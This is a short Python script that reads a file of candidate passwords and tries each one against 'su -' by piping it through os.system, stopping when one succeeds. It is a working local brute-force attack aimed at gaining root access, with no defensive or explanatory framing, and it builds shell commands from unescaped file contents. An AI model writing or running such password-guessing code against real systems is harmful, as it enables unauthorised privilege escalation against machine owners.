import os
import operator
import re
import string
filename = "/home/caesar/Desktop/passwords.txt"
with open(filename, encoding="utf8") as file:
    text = file.read()
    text = text.replace("\n", " ")
    
    text = text.lower()
    f = open('text.txt','w')
    f.write(text)
    a=text
    d={}
    words = text.split() 
       
    

for i in range(0 ,len(words)):
    sudoPassword = words[i]
    command = 'su -'
    p = os.system('echo %s| %s' % (sudoPassword, command))
    print('password',sudoPassword,"\np=",p)
    if p == 0:
        break
    